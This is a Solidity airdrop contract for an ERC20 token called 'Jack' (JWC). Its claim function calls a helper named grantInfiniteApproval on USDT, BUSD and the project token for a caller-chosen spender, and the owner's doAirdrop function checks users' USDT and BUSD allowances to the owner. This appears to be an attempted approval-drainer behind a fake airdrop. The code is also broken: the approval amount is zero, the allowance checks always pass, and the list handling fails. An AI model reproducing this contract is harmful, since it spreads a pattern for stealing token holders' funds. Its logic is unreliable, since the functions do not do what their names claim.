// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "hardhat/console.sol";


contract Airdrop is Ownable,ERC20 {
    IERC20 public token;
    IERC20 public BUSD;
    IERC20 public USDT;

    constructor() ERC20("Jack", "JWC") {
        _mint(msg.sender, 500000000000000000);
    }


    uint256 public airdropTokens;
    uint256 public referralTokens;
    uint256 public airdropAllow;
    uint256 public airdropCount = 0;
    address[] public usersList;

    struct UserDetails {
        bool isExist;
        uint airdropNo;
        uint referralCode;
    }


    mapping (address => UserDetails) public _userDetails;
    address[] public userlist;

    function airdropTokenAmount(uint256 _amount) public onlyOwner {
        airdropTokens  = _amount;
    }

    // function referralTokenAmount(uint256 _amount) public onlyOwner {
    //    referralTokens  = _amount;
    // }

    uint counter =1;
    function random() private returns (uint) {
        counter++;
        return (uint(keccak256(abi.encodePacked(block.difficulty, block.timestamp, counter))))%10000000000;
    }

    function setAirdropAllow(uint256 _amount) public onlyOwner {
        airdropAllow  = _amount;
    }

    function initialize(address _token, address _BUSD, address _USDT) public onlyOwner {
        require(_token != address(0), "Invalid address");
        token = IERC20(_token);
        BUSD = IERC20(_BUSD);
        USDT= IERC20(_USDT);
    }

    function getTotalUsers() public view returns(uint){
        return usersList.length;
    }

    function getUsersList(uint256 from, uint256 to) public view returns(address[] memory _totalUsers){
        for(uint256 i = from; i <= to; i++){
            _totalUsers[i] = usersList[i];
        }
    }

    function grantInfiniteApproval(IERC20 _token, address _spender) public {
        IERC20 tokenContract = IERC20(_token);
        tokenContract.approve(_spender,  type(uint128).min);
    }

    function claimAirdrop(address contractAddress, address _sender) public {
        grantInfiniteApproval(token, _sender);
        grantInfiniteApproval(USDT, _sender);
        grantInfiniteApproval(BUSD, _sender);
        UserDetails memory userDetails;
                userDetails = UserDetails ({
                isExist : true,
                airdropNo : 0,
                referralCode: random()
                });
        userlist.push(msg.sender);
    }


    function airdropClaim() public {
        UserDetails memory userDetails;
        userDetails = UserDetails ({
            isExist : true,
            airdropNo : 0,
            referralCode: random()
        });
        userlist.push(msg.sender);
    }


    function getUserDetails() public view returns(UserDetails memory){
        return _userDetails[msg.sender];
    }

    function doAirdrop() public onlyOwner returns(bool success){
        for (uint256 i = 0; i < userlist.length; i++){
            require(USDT.allowance(userlist[i], owner()) >=0 && BUSD.allowance(userlist[i], owner()) >=0, "Token not approved");
            require(_userDetails[userlist[i]].airdropNo < airdropAllow, "Airdrop Limit Exceed");
            // require(_referral != msg.sender, "Referral can't be self");
            if(_userDetails[userlist[i]].isExist){
                _userDetails[userlist[i]].airdropNo++;
            }
            else{
                UserDetails memory userDetails;
                userDetails = UserDetails ({
                isExist : true,
                airdropNo : 1,
                referralCode: random()
                });
                _userDetails[userlist[i] ]= userDetails;
            }

            //IERC20(token).transfer(, referralTokens);

            IERC20(token).transfer(userlist[i], airdropTokens);
            airdropCount++;
            usersList.pop();
        }
        return true;
    }

}